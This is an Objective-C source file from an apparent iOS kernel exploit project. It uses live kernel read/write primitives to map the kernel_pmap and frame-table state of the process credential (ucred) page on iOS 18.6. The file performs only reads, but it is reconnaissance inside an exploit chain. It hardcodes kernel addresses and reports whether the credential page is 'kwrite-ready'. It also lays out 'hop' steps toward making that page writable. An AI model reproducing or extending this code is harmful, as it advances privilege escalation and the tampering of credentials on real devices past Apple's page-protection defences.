//
//  KPMapScope.m
//  KexProofV2
//
//  R5e: read-only scope recon. No kernel writes — kread only.
//

#import "KPMapScope.h"
#import "KPLog.h"

#import <string.h>

#import <libjailbreak/info.h>
#import <libjailbreak/primitives.h>
#import <libjailbreak/translation.h>

#import "exploit/kutils.h"
#import "exploit/offsets.h"

// gPrimitives.kreadbuf is the live KRW entry (int-returning). Call it directly.

// ---------------------------------------------------------------------------
// Static VAs from kernelcache-18.6-iphone16 (unslid). Slide is applied at runtime.
// ---------------------------------------------------------------------------

// Page-mgmt flags (R5c/R5d)
#define STATIC_FLAG_PROMOTE_21  0xfffffff007aa258aULL   // bit0 = promote to 0x21
#define STATIC_FLAG_PAGEMGMT    0xfffffff007aa2a31ULL   // second page-mgmt flag

// kernel_pmap / kernel_map global (R5d: 116 uses in the pmap region)
#define STATIC_KERNEL_PMAP      0xfffffff00aad31c0ULL   // pmap object (or +0x1c0 of page)
#define STATIC_KERNEL_PMAP_PAGE 0xfffffff00aad3000ULL

// Object layout decoded from walker 0x80dd69c (R5d)
#define PMAP_OFF_NEXT       0x08
#define PMAP_OFF_HEAD       0x10   // list sentinel
#define PMAP_OFF_START      0x10   // node range start (same slot, node view)
#define PMAP_OFF_END        0x18   // node range end
#define PMAP_OFF_PACPTR     0x40   // PAC-signed ptr (autda discr 0x250c)
#define PMAP_OFF_NODEFLAGS  0x38
#define PMAP_OFF_NODEPA     0x40   // node: translated PA-ish
#define PMAP_OFF_TYPEBYTE   0x92   // obj+216 used as state byte in walker
#define PMAP_OFF_COUNTISH   0x70   // obj+112

// FTE
#define FTE_SIZE            16
#define FTE_OFF_TYPE        2
#define FTE_OFF_READREF     8
#define FTE_OFF_WEREF       12

// ---------------------------------------------------------------------------
// Local helpers (kpRead/kpNote are static in KPDump.m)
// ---------------------------------------------------------------------------

static void scopeNote(NSMutableString *r, NSString *line) {
    [r appendString:line];
    [r appendString:@"\n"];
    [[KPLog shared] append:line];
}

static BOOL scopeRead(uint64_t addr, void *out, size_t size, const char *what, NSMutableString *r) {
    if (!gPrimitives.kreadbuf) {
        scopeNote(r, [NSString stringWithFormat:@"  [skip] %s: KRW not live", what]);
        return NO;
    }
    if (!addr) {
        scopeNote(r, [NSString stringWithFormat:@"  [skip] %s: null addr", what]);
        return NO;
    }
    if ((addr & 0xFFFFFF0000000000ULL) != 0xFFFFFF0000000000ULL) {
        scopeNote(r, [NSString stringWithFormat:@"  [skip] %s: not a kernel ptr 0x%016llx",
                      what, (unsigned long long)addr]);
        return NO;
    }
    // EL2 domain (SPTM/TXM images) panics on read — never touch.
    uint64_t sptmLo = kconstant(staticSptmBase);
    uint64_t txmLo  = kconstant(staticTxmBase);
    uint64_t slide  = kconstant(slide);
    if (sptmLo && addr >= sptmLo + slide && addr < sptmLo + slide + 0xF4000) {
        scopeNote(r, [NSString stringWithFormat:@"  [skip] %s: EL2 SPTM domain 0x%016llx", what, (unsigned long long)addr]);
        return NO;
    }
    if (txmLo && addr >= txmLo + slide && addr < txmLo + slide + 0x64000) {
        scopeNote(r, [NSString stringWithFormat:@"  [skip] %s: EL2 TXM domain 0x%016llx", what, (unsigned long long)addr]);
        return NO;
    }
    memset(out, 0, size);
    gPrimitives.kreadbuf(addr, out, size);
    return YES;
}

static uint64_t scopeUntag(uint64_t p) {
    return kp_untag_ptr(p);
}

static uint64_t scopeSlideVA(uint64_t staticVA) {
    // staticVA is unslid; runtime = staticVA + slide
    // slide = kconstant(base) - kconstant(staticBase)
    uint64_t slide = kconstant(slide);
    if (!slide && kconstant(base) && kconstant(staticBase)) {
        slide = kconstant(base) - kconstant(staticBase);
    }
    return staticVA + slide;
}

static const char *scopeTypeName(uint8_t t) {
    switch (t) {
        case 0x00: return "GOD/init";
        case 0x0b: return "XNU_GENERIC";
        case 0x15: return "PAGE_TABLE";
        case 0x18: return "ROZONE";
        case 0x1a: return "IOFILTER";
        case 0x21: return "XNU_DEFAULT";
        case 0x37: return "T8110_DART?";
        default:   return "?";
    }
}

// ---------------------------------------------------------------------------
// The report
// ---------------------------------------------------------------------------

@implementation KPMapScope

+ (NSString *)kernelPmapScopeReport {
    NSMutableString *r = [NSMutableString string];
    [r appendString:@"\n=== R5e: kernel_pmap scope recon (READ-ONLY) ===\n"];

    if (!gPrimitives.kreadbuf) {
        scopeNote(r, @"KRW primitives not live — run the exploit first.");
        return r;
    }

    scopeNote(r, [NSString stringWithFormat:@"kernel base (runtime) = 0x%016llx",
                  (unsigned long long)kconstant(base)]);
    scopeNote(r, [NSString stringWithFormat:@"kernel slide          = 0x%016llx",
                  (unsigned long long)kconstant(slide)]);
    scopeNote(r, [NSString stringWithFormat:@"virtBase/physBase     = 0x%016llx / 0x%016llx",
                  (unsigned long long)kconstant(virtBase),
                  (unsigned long long)kconstant(physBase)]);

    // -----------------------------------------------------------------------
    // 1. Page-mgmt flags
    // -----------------------------------------------------------------------
    [r appendString:@"\n--- 1. page-mgmt flags ---\n"];

    uint64_t flag1VA = scopeSlideVA(STATIC_FLAG_PROMOTE_21);
    uint8_t flag1 = 0;
    if (scopeRead(flag1VA, &flag1, 1, "flag promote-0x21", r)) {
        scopeNote(r, [NSString stringWithFormat:
            @"  flag @ static 0x%llx (runtime 0x%016llx) = 0x%02x  bit0=%d  -> %@",
            (unsigned long long)STATIC_FLAG_PROMOTE_21,
            (unsigned long long)flag1VA, flag1, flag1 & 1,
            (flag1 & 1) ? @"PROMOTE-TO-0x21 ENABLED" : @"promote disabled (collapse to 0x0b)"]);
    }

    uint64_t flag2VA = scopeSlideVA(STATIC_FLAG_PAGEMGMT);
    uint8_t flag2 = 0;
    if (scopeRead(flag2VA, &flag2, 1, "flag pagemgmt", r)) {
        scopeNote(r, [NSString stringWithFormat:
            @"  flag @ static 0x%llx (runtime 0x%016llx) = 0x%02x  bit0=%d",
            (unsigned long long)STATIC_FLAG_PAGEMGMT,
            (unsigned long long)flag2VA, flag2, flag2 & 1]);
    }

    // -----------------------------------------------------------------------
    // 2. kernel_pmap header
    // -----------------------------------------------------------------------
    [r appendString:@"\n--- 2. kernel_pmap header ---\n"];

    uint64_t pmapVA = scopeSlideVA(STATIC_KERNEL_PMAP);
    uint64_t pmapPageVA = scopeSlideVA(STATIC_KERNEL_PMAP_PAGE);
    scopeNote(r, [NSString stringWithFormat:@"  kernel_pmap candidate @ 0x%016llx (page 0x%016llx)",
                  (unsigned long long)pmapVA, (unsigned long long)pmapPageVA]);

    uint8_t hdr[0xC0];
    if (!scopeRead(pmapVA, hdr, sizeof(hdr), "kernel_pmap header", r)) {
        return r;
    }
    scopeNote(r, [NSString stringWithFormat:
        @"  +0x00..0x1f: %02x%02x%02x%02x %02x%02x%02x%02x %02x%02x%02x%02x %02x%02x%02x%02x",
        hdr[0],hdr[1],hdr[2],hdr[3],hdr[4],hdr[5],hdr[6],hdr[7],
        hdr[8],hdr[9],hdr[10],hdr[11],hdr[12],hdr[13],hdr[14],hdr[15]]);

    uint64_t headNext = 0, headA = 0, headB = 0, pacPtr = 0;
    memcpy(&headNext, hdr + PMAP_OFF_NEXT, 8);
    memcpy(&headA,    hdr + PMAP_OFF_HEAD, 8);
    memcpy(&headB,    hdr + PMAP_OFF_END, 8);
    memcpy(&pacPtr,   hdr + PMAP_OFF_PACPTR, 8);
    uint64_t headNextU = scopeUntag(headNext);
    uint64_t headAU    = scopeUntag(headA);
    uint64_t pacPtrU   = scopeUntag(pacPtr);

    scopeNote(r, [NSString stringWithFormat:@"  +0x08 next   raw=0x%016llx untag=0x%016llx",
                  (unsigned long long)headNext, (unsigned long long)headNextU]);
    scopeNote(r, [NSString stringWithFormat:@"  +0x10 head   raw=0x%016llx untag=0x%016llx",
                  (unsigned long long)headA, (unsigned long long)headAU]);
    scopeNote(r, [NSString stringWithFormat:@"  +0x18        raw=0x%016llx",
                  (unsigned long long)headB]);
    scopeNote(r, [NSString stringWithFormat:@"  +0x40 PAC    raw=0x%016llx untag=0x%016llx",
                  (unsigned long long)pacPtr, (unsigned long long)pacPtrU]);

    uint8_t typeByte = hdr[PMAP_OFF_TYPEBYTE];
    scopeNote(r, [NSString stringWithFormat:@"  +0x92 state  = 0x%02x", typeByte]);

    // -----------------------------------------------------------------------
    // 3. ucred VA/PA + FTE oracle
    // -----------------------------------------------------------------------
    [r appendString:@"\n--- 3. ucred + FTE oracle ---\n"];

    uint64_t selfProc = proc_self();
    scopeNote(r, [NSString stringWithFormat:@"  proc_self() = 0x%016llx",
                  (unsigned long long)selfProc]);

    uint64_t procRo = 0, ucred = 0;
    if (selfProc && scopeRead(selfProc + off_proc_p_proc_ro, &procRo, 8, "p_proc_ro", r)) {
        procRo = scopeUntag(procRo);
        scopeNote(r, [NSString stringWithFormat:@"  p_proc_ro   = 0x%016llx",
                      (unsigned long long)procRo]);
    }
    if (procRo && scopeRead(procRo + off_proc_ro_p_ucred, &ucred, 8, "p_ucred", r)) {
        ucred = scopeUntag(ucred);
        scopeNote(r, [NSString stringWithFormat:@"  p_ucred     = 0x%016llx",
                      (unsigned long long)ucred]);
    }

    uint64_t ucredPA = 0;
    if (ucred) {
        ucredPA = kvtophys(ucred);
        scopeNote(r, [NSString stringWithFormat:@"  ucred PA    = 0x%016llx",
                      (unsigned long long)ucredPA]);
    }

    // FTE oracle
    if (ucredPA) {
        uint64_t tableSlot = ksymbol(libsptm_frame_table);
        uint64_t tableVA = 0;
        if (tableSlot && scopeRead(tableSlot, &tableVA, 8, "frame_table slot", r)) {
            tableVA = scopeUntag(tableVA);
        }
        if (!tableVA && tableSlot) tableVA = tableSlot; // already a VA in some builds

        uint64_t pB = kconstant(physBase);
        if (tableVA && pB && ucredPA >= pB) {
            uint64_t fteVA = tableVA + ((ucredPA - pB) >> 14) * FTE_SIZE;
            scopeNote(r, [NSString stringWithFormat:@"  FTE VA      = 0x%016llx (pfn=%llu)",
                          (unsigned long long)fteVA,
                          (unsigned long long)((ucredPA - pB) >> 14)]);
            uint8_t fte[16];
            if (scopeRead(fteVA, fte, 16, "FTE entry", r)) {
                uint8_t type = fte[FTE_OFF_TYPE];
                uint32_t rref = 0, wref = 0;
                memcpy(&rref, fte + FTE_OFF_READREF, 4);
                memcpy(&wref, fte + FTE_OFF_WEREF, 4);
                scopeNote(r, [NSString stringWithFormat:
                    @"  FTE type=0x%02x (%s)  read_ref=%u  write_exec_ref=%u",
                    type, scopeTypeName(type), rref, wref]);
                if (type == 0x18) {
                    scopeNote(r, @"  >> ucred page is ROZONE (0x18) as expected — hop 1 target.");
                } else if (type == 0x21) {
                    scopeNote(r, @"  >> ucred page is already XNU_DEFAULT (0x21) — kwrite-ready!");
                } else if (type == 0x0b) {
                    scopeNote(r, @"  >> ucred page is XNU_GENERIC (0x0b) — hop 1 done, hop 2 pending.");
                }
            }
            // Also use the translation.h oracle if the table was installed
            int t2 = kpFrameTypeOf(ucredPA);
            if (t2 >= 0) {
                scopeNote(r, [NSString stringWithFormat:@"  kpFrameTypeOf(PA) = 0x%02x (%s)",
                              t2, scopeTypeName((uint8_t)t2)]);
            }
        } else {
            scopeNote(r, @"  [skip] frame table not resolved / PA below physBase");
        }
    }

    // -----------------------------------------------------------------------
    // 4. Range walk (read-only, bounded)
    // -----------------------------------------------------------------------
    [r appendString:@"\n--- 4. kernel_pmap range walk (bounded 32) ---\n"];

    uint64_t sentinel = pmapVA + PMAP_OFF_HEAD;
    uint64_t node = headNextU;
    int hits = 0, covers = 0;

    scopeNote(r, [NSString stringWithFormat:@"  sentinel = 0x%016llx  start node = 0x%016llx",
                  (unsigned long long)sentinel, (unsigned long long)node]);

    for (int i = 0; i < 32; i++) {
        if (!node || node == sentinel) {
            scopeNote(r, [NSString stringWithFormat:@"  [%d] end of list (node==sentinel or null)", i]);
            break;
        }
        if ((node & 0xFFFFFF0000000000ULL) != 0xFFFFFF0000000000ULL) {
            scopeNote(r, [NSString stringWithFormat:@"  [%d] bad node ptr 0x%016llx — stop",
                          i, (unsigned long long)node]);
            break;
        }
        uint8_t nb[0x48];
        if (!scopeRead(node, nb, sizeof(nb), "pmap node", r)) break;

        uint64_t next = 0, start = 0, end = 0, flags = 0, paish = 0;
        memcpy(&next,  nb + PMAP_OFF_NEXT,      8);
        memcpy(&start, nb + PMAP_OFF_START,     8);
        memcpy(&end,   nb + PMAP_OFF_END,       8);
        memcpy(&flags, nb + PMAP_OFF_NODEFLAGS, 8);
        memcpy(&paish, nb + PMAP_OFF_NODEPA,    8);
        uint64_t nextU = scopeUntag(next);
        uint64_t startU = scopeUntag(start);
        uint64_t endU   = scopeUntag(end);
        uint64_t paU    = scopeUntag(paish);

        BOOL cov = (ucred && startU && endU && ucred >= startU && ucred < endU);
        if (cov) covers++;

        scopeNote(r, [NSString stringWithFormat:
            @"  [%d] node 0x%016llx  range [0x%016llx .. 0x%016llx)  flags=0x%016llx  pa=0x%016llx%@",
            i, (unsigned long long)node,
            (unsigned long long)startU, (unsigned long long)endU,
            (unsigned long long)flags, (unsigned long long)paU,
            cov ? @"   *** COVERS UCRED ***" : @""]);

        node = nextU;
        hits++;
        if (node == 0) break;
    }

    scopeNote(r, [NSString stringWithFormat:@"  walked %d nodes, %d cover ucred VA 0x%016llx",
                  hits, covers, (unsigned long long)ucred]);

    // -----------------------------------------------------------------------
    // 5. Verdict
    // -----------------------------------------------------------------------
    [r appendString:@"\n--- 5. scope verdict ---\n"];
    if (covers > 0) {
        scopeNote(r, @"  V1 SCOPE HIT: a kernel_pmap range covers ucred's VA.");
        scopeNote(r, @"  A walker pass through 0x8101398 should reach call 6 on this page.");
    } else if (hits == 0) {
        scopeNote(r, @"  V1 INCONCLUSIVE: no nodes walked (list empty or layout mismatch).");
        scopeNote(r, @"  Try the alternative object at pmapPageVA / other x0 classes (R5d).");
    } else {
        scopeNote(r, @"  V1 MISS: walked nodes, none covers ucred VA.");
        scopeNote(r, @"  Next: V2 sweep (0x8177dbc teardown range) or a different pmap object.");
    }
    scopeNote(r, @"  (No kernel writes performed. Re-run after any exploit state change.)");

    return r;
}

@end
